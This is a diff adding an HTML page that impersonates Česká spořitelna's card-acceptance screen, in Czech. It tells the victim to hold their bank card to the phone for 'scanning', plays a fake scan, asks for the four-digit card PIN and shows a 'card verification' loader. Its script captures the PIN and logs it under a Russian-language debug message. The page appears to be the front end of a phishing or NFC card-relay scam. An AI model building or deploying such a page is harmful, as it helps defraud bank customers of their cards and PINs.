@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="image/svg" href="images/fav.png">
+    <title>Česká spořitelna | Přijetí karty</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+    <div class="nfc__back"></div>
+    <div class="nfc">
+        <div class="nfc__logo"><img src="images/c_logo.png" alt="logo"></div>
+        
+        <div class="nfc__first">
+            <div class="nfc__title">Přiložte kartu čipem nahoru k zadní části zařízení.</div>
+
+            <div class="nfc__center">
+                <p>Čekám na kartu</p>
+                <div class="nfc__loader"></div>
+            </div>
+        </div>
+
+        <div class="nfc__second">
+            <div class="nfc__title">Nesahejte na zařízení, počkejte, až skončí skenování.</div>
+
+            <div class="nfc__card">
+                <img src="images/bg-card.png" alt="card">
+                <div class="nfc__number">
+                    <div class="nfc__num">0000</div>
+                    <div class="nfc__num">0000</div>
+                    <div class="nfc__num">0000</div>
+                    <div class="nfc__num">0000</div>
+                </div>
+
+                <div class="nfc__date">00/00</div>
+            </div>
+
+            <div class="nfc__button"><p>Spustit skenování</p></div>
+        </div>
+    </div>
+
+    <div class="pin">
+        <div class="pin__title">Zadejte PIN kód</div>
+
+        <div class="pin__pass">
+            <div class="pin__circle"></div>
+            <div class="pin__circle"></div>
+            <div class="pin__circle"></div>
+            <div class="pin__circle"></div>
+        </div>
+
+        <div class="pin__calc">
+            <div class="pin__btn"><p>1</p></div>
+            <div class="pin__btn"><p>2</p></div>
+            <div class="pin__btn"><p>3</p></div>
+            
+            <div class="pin__btn"><p>4</p></div>
+            <div class="pin__btn"><p>5</p></div>
+            <div class="pin__btn"><p>6</p></div>
+            
+            <div class="pin__btn"><p>7</p></div>
+            <div class="pin__btn"><p>8</p></div>
+            <div class="pin__btn"><p>9</p></div>
+            
+            <div class="pin__none"></div>
+            <div class="pin__btn"><p>0</p></div>
+            <div class="pin__remove">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-backspace-fill" viewBox="0 0 16 16">
+                    <path d="M15.683 3a2 2 0 0 0-2-2h-7.08a2 2 0 0 0-1.519.698L.241 7.35a1 1 0 0 0 0 1.302l4.843 5.65A2 2 0 0 0 6.603 15h7.08a2 2 0 0 0 2-2zM5.829 5.854a.5.5 0 1 1 .707-.708l2.147 2.147 2.146-2.147a.5.5 0 1 1 .707.708L9.39 8l2.146 2.146a.5.5 0 0 1-.707.708L8.683 8.707l-2.147 2.147a.5.5 0 0 1-.707-.708L7.976 8z"/>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <div class="verif">
+        <div class="verif__body">
+            <p>Ověření karty</p>
+            <div class="verif__loader"></div>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            setTimeout( () => {
+                document.querySelector('.nfc__back').style.opacity = 0.2;
+                setTimeout( () => {
+                    document.querySelector('.nfc').style.opacity = 1;
+                }, 100)
+            }, 1000)
+
+            setTimeout( () => {
+                document.querySelector('.nfc__first').style.display = "none";
+                document.querySelector('.nfc__second').style.display = "block";
+            }, 3000)
+
+            document.querySelector('.nfc__button').addEventListener("click", event => {
+                document.querySelector('.nfc__back').style.display = "none";
+                document.querySelector('.nfc').style.display = "none";
+                document.querySelector('.pin').style.display = "block";
+            })
+
+            let allCode = [];
+
+            document.querySelectorAll('.pin__btn').forEach( (item, i) => {
+                item.addEventListener("click", event => {
+
+                    document.querySelectorAll('.pin__circle').forEach( (item, i) => {
+                        item.classList.remove('pin__circle-active');
+                    }) 
+
+                    if ( allCode.length != 4 ) {
+                        allCode.push(item.textContent);
+                        if ( allCode.length == 4 ) {
+                            console.log(`Запуск финального экрана, код - ${allCode[0]}${allCode[1]}${allCode[2]}${allCode[3]}`);
+                        
+                            document.querySelector('.pin').style.display = "none";
+                            document.querySelector('.nfc').style.display = "block";
+                            document.querySelector('.nfc__back').style.display = "block";
+                            document.querySelector('.nfc__second').style.display = "block";
+                            document.querySelector('.verif').style.display = "flex";
+                        }
+                    }
+
+                    allCode.forEach( (item, i) => {
+                        document.querySelectorAll('.pin__circle')[i].classList.add('pin__circle-active');
+                    })
+
+                })
+            })
+
+            document.querySelector('.pin__remove').addEventListener('click', event => {
+                if ( allCode.length != 0 ) {
+
+                    allCode.pop();
+
+                    document.querySelectorAll('.pin__circle').forEach( (item, i) => {
+                        item.classList.remove('pin__circle-active');
+                    }) 
+
+                    allCode.forEach( (item, i) => {
+                        document.querySelectorAll('.pin__circle')[i].classList.add('pin__circle-active');
+                    })
+
+                }
+            })
+        };
+    </script>
+</body>
+</html>
